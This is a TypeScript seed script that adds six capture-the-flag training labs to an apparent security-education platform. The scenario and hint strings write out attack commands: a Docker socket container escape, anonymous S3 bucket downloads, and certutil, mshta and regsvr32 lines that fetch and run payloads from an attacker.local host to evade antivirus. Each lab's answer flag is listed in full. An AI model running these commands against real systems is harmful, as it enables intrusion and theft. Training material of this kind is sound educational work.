import { db } from "../src/lib/db"

const NEW_LABS = [
  {
    title: "Docker Container Escape",
    slug: "docker-container-escape",
    category: "Cloud Security",
    difficulty: "Hard",
    durationMin: 50,
    points: 400,
    description: "Exploit a misconfigured Docker container to escape to the host system.",
    longDescription:
      "A Docker container runs with excessive capabilities and a mounted Docker socket. Exploit these misconfigurations to break out of the container and read the host's flag.",
    scenario:
      "## Mission Briefing\n\nYou have shell access inside a Docker container.\n\n1. Check capabilities: `cat /proc/1/status | grep Cap`\n2. Notice the Docker socket is mounted: `ls -la /var/run/docker.sock`\n3. Use the Docker CLI to create a new container that mounts the host filesystem\n4. Read `/host/root/flag.txt`\n\n```\ndocker run -v /:/host -it alpine cat /host/root/flag.txt\n```",
    objectives: "Identify excessive capabilities|Find mounted Docker socket|Escape to host filesystem|Read host flag",
    hints: "Check /proc/1/status for CapEff|Look for /var/run/docker.sock|docker run -v /:/host alpine|The flag is at /host/root/flag.txt",
    flag: "FLAG{d0ck3r_c0nt41n3r_3sc4p3}",
    commands: "whoami|ls|cat|docker|find|help",
    color: "cyan",
  },
  {
    title: "OSINT — Target Profiling",
    slug: "osint-target-profiling",
    category: "OSINT",
    difficulty: "Easy",
    durationMin: 25,
    points: 150,
    description: "Gather open-source intelligence on a target organization using public tools.",
    longDescription:
      "Use OSINT techniques to profile a fictional company 'TechCorp Inc.' — find their employee count, tech stack, and exposed services from public sources.",
    scenario:
      "## Mission Briefing\n\nTarget: TechCorp Inc. (techcorp.example)\n\n1. Check their careers page for employee count hints\n2. Search GitHub for 'techcorp' repos to find their tech stack\n3. Use Shodan to find exposed services on their IP range\n4. The flag is hidden in their public job posting for 'Senior Security Engineer'",
    objectives: "Find employee count|Identify tech stack|Find exposed services|Extract flag from job posting",
    hints: "Check techcorp.example/careers|Search github.com/techcorp|The job posting mentions a 'flag' in the requirements|Look for the security engineer role",
    flag: "FLAG{0s1nt_t4rg3t_pr0f1l3d}",
    commands: "whoami|curl|dig|nslookup|help",
    color: "emerald",
  },
  {
    title: "Android APK Reverse Engineering",
    slug: "android-apk-reverse",
    category: "Mobile Security",
    difficulty: "Hard",
    durationMin: 45,
    points: 350,
    description: "Decompile an Android APK to extract a hardcoded API key and secret flag.",
    longDescription:
      "You're given an Android APK file. Use apktool and jadx to decompile it, find the hardcoded API key, and extract the flag from the decompiled source code.",
    scenario:
      "## Mission Briefing\n\nFile: `/home/guardian/target.apk`\n\n1. Decompile: `apktool d target.apk -o decoded`\n2. Search for strings: `grep -r 'FLAG{' decoded/`\n3. Use jadx for Java decompilation: `jadx target.apk -d jadx_out`\n4. The flag is in `com.techcorp.SecretActivity.java`\n\nThe API key is also hidden in `res/values/strings.xml`",
    objectives: "Decompile the APK|Find hardcoded API key|Extract the flag from source",
    hints: "Use apktool d to decompile|grep -r 'FLAG{' to search|The flag is in SecretActivity|Check strings.xml for api_key",
    flag: "FLAG{4ndr01d_4pk_r3v3rs3d}",
    commands: "whoami|file|apktool|jadx|grep|strings|help",
    color: "violet",
  },
  {
    title: "IoT Firmware Analysis",
    slug: "iot-firmware-analysis",
    category: "IoT Security",
    difficulty: "Medium",
    durationMin: 35,
    points: 250,
    description: "Extract and analyze a router firmware image to find default credentials.",
    longDescription:
      "A firmware binary from a vulnerable IoT router needs analysis. Use binwalk to extract the filesystem, find the default credentials, and locate the hidden flag.",
    scenario:
      "## Mission Briefing\n\nFile: `/home/guardian/firmware.bin`\n\n1. Extract: `binwalk -e firmware.bin`\n2. Navigate the extracted filesystem: `cd _firmware.bin.extracted/squashfs-root`\n3. Check `/etc/shadow` for password hashes\n4. Check `/etc/passwd` for default users\n5. The flag is in `/etc/motd`",
    objectives: "Extract firmware filesystem|Find default credentials|Read the flag from /etc/motd",
    hints: "binwalk -e extracts the filesystem|Check /etc/passwd for default users|The flag is in /etc/motd|Look for 'admin:admin' default creds",
    flag: "FLAG{10t_f1rmw4r3_3xtr4ct3d}",
    commands: "whoami|binwalk|file|cat|find|strings|help",
    color: "amber",
  },
  {
    title: "Cloud S3 Bucket Enumeration",
    slug: "cloud-s3-enumeration",
    category: "Cloud Security",
    difficulty: "Medium",
    durationMin: 30,
    points: 200,
    description: "Discover and exploit a misconfigured public S3 bucket to extract sensitive data.",
    longDescription:
      "A company has a misconfigured AWS S3 bucket with public read access. Enumerate the bucket contents, find the sensitive files, and extract the flag.",
    scenario:
      "## Mission Briefing\n\nTarget: `s3://techcorp-backup-public`\n\n1. List bucket contents: `aws s3 ls s3://techcorp-backup-public --no-sign-request`\n2. Download interesting files: `aws s3 cp s3://techcorp-backup-public/config.env . --no-sign-request`\n3. The flag is in a file called `secret-flag.txt`\n4. Also check the `backups/` directory for database dumps",
    objectives: "List bucket contents|Download sensitive files|Find the flag file",
    hints: "Use --no-sign-request for anonymous access|Check for .env files|The flag is in secret-flag.txt|Look in the backups/ directory",
    flag: "FLAG{s3_buck3t_3num3r4t3d}",
    commands: "whoami|aws|curl|cat|ls|help",
    color: "cyan",
  },
  {
    title: "PowerShell Empire — Living Off the Land",
    slug: "powershell-lolbins",
    category: "Active Directory",
    difficulty: "Medium",
    durationMin: 35,
    points: 250,
    description: "Use legitimate Windows binaries (LOLBins) to execute payloads and evade detection.",
    longDescription:
      "You have a limited shell on a Windows machine with AV blocking custom executables. Use Living Off the Land Binaries (LOLBins) like certutil, mshta, and regsvr32 to download and execute a payload.",
    scenario:
      "## Mission Briefing\n\nYou have cmd.exe access on a Windows 10 machine with Windows Defender enabled.\n\n1. Try downloading a file with certutil:\n   `certutil -urlcache -split -f http://attacker.local/payload.exe C:\\\\Temp\\\\p.exe`\n2. Use mshta to execute a remote HTA file\n3. Use regsvr32 with /s /u /i for scriptlet execution\n4. The flag is in `C:\\\\Users\\\\Public\\\\flag.txt` (readable after execution)\n\nOnly LOLBins will bypass the AV signatures.",
    objectives: "Download payload via certutil|Execute via mshta or regsvr32|Read the flag from Public folder",
    hints: "certutil -urlcache -split -f URL PATH|mshta http://attacker/local/payload.hta|regsvr32 /s /u /i:http://attacker/local/sc.sct|Flag at C:\\Users\\Public\\flag.txt",
    flag: "FLAG{p0w3rsh3ll_l0lb1ns}",
    commands: "whoami|dir|type|certutil|mshta|regsvr32|help",
    color: "orange",
  },
]

async function main() {
  console.log("Adding new labs...")
  let added = 0
  for (const lab of NEW_LABS) {
    const existing = await db.lab.findUnique({ where: { slug: lab.slug } })
    if (!existing) {
      await db.lab.create({ data: lab })
      added++
      console.log(`  + ${lab.title}`)
    } else {
      console.log(`  = ${lab.title} (exists)`)
    }
  }
  console.log(`Done. Added ${added} new labs.`)
}

main()
  .catch((e) => { console.error(e); process.exit(1) })
  .finally(async () => { await db.$disconnect() })
